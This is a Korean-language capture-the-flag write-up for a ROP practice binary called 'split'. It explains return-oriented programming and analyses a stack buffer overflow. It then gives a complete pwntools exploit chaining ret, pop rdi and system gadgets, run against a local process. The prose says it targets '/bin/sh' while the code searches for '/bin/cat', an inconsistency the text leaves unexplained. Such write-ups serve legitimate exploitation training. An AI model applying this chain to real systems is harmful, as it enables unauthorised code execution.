### 🍞 개념

---

#### ROP (Return Oriented Programming)

NX로 스택에 올린 셸코드를 “실행”할 수 없게 되었을 때, 이미 실행 권한이 있는 바이너리/라이브러리 코드 조각을 이어붙여서 원하는 동작을 가능하게 하는 기법

#### 가젯 gadget

함수가 return 할 때 ret 명령어는 스택 top의 값을 그래로 pop해서 그 주소로 점프

오버플로로 리턴 주소를 가젯으로 덮은 뒤 pop rdi, ret 등의 가젯으로 레지스터에 해당 인자 세팅

그 다음 원하는 함수 주소로 점프 (ex : system)

### 🔎 코드 분석

---

<img width="984" height="282" alt="image" src="https://github.com/user-attachments/assets/5652dc89-bc3d-46b0-8a18-c71bbdb7ace0" />

NX 말고는 문제 없다. NX가 활성화 되어있어서 셸코드 주입은 어렵다.

<img width="696" height="788" alt="image" src="https://github.com/user-attachments/assets/17d9b5b0-72ec-42bf-83e6-9c31245a014e" />
어떤 function이 있는지 확인해보자

<img width="1364" height="1190" alt="image" src="https://github.com/user-attachments/assets/dbcb72f1-ef74-49e4-93c9-04813c86bf3d" />

pwnme 함수를 disass하면 이런 결과가 나온다

`read`로 읽을 때 `0x20`크기의 버퍼를 `0x60`만큼 읽어올 수 있는 것 같다 → 버퍼 오버플로우 가능

<img width="1116" height="382" alt="image" src="https://github.com/user-attachments/assets/6985a487-977b-43e5-b497-a2f38fc82c4e" />
got 분석 시에 `system` 함수가 있는 것을 확인 가능하다

<img width="918" height="136" alt="image" src="https://github.com/user-attachments/assets/b913d53d-ef51-4a3f-a7a6-ef0c653df059" />
libc 안에 `“/bin/sh”` 문자열이 있는 것도 확인 가능하다

### 🗡️ 익스플로잇

---

`system(”/bin/sh”)`를 설정할 수 있도록 

`“/bin/sh”`를 rdi에 넣어주는 가젯이 필요하다

<img width="1122" height="266" alt="image" src="https://github.com/user-attachments/assets/96ed975b-cfcd-4e06-9502-5fc4c2b9a504" />

이미 찾았지롱 ㅎㅎ

#### 1️⃣ `system` PLT와 `‘bin/sh’` 위치 찾기

PIE가 적용되어 있지 않기 때문에 `./split` 바이너리 안에서 해당 위치를 둘 다 바로 찾을 수 있다.

```python
system = elf.plt['system']
binsh  = next(elf.search(b'/bin/cat'))
```

#### 2️⃣ 버퍼 오버플로우로 RET 닿기

버퍼 오버플로우가 가능하기 때문에 RET에 닿도록 더미를 채운다

```python
exploit = b'A'*0x20 + b'B'*8
```

#### 3️⃣ ROP 가젯을 사용

```python
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(system)
```

`rdi`를 `“bin/sh”`로 설정한 뒤에 system 함수의 plt로 이동한다

⚠️ 이렇게 하면 ret 정렬이 안 맞아서 크래시가 난다!!

```python
exploit += p64(ret)
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(system)
```

ret 가젯을 찾아서 포함해주면 된다

#### ♾️ 전체 익스플로잇 코드

```python
from pwn import *

p = process('./split')
elf = ELF("./split")

system = elf.plt['system']
binsh  = next(elf.search(b'/bin/cat'))
poprdi = 0x4007c3
ret = 0x40053e

exploit = b'A'*0x20 + b'B'*8
exploit += p64(ret)
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(system)

p.sendline(exploit)
p.interactive()
```

<img width="1364" height="1190" alt="image" src="https://github.com/user-attachments/assets/dc9dbce2-1722-47a2-b965-7e3eb1642d70" />
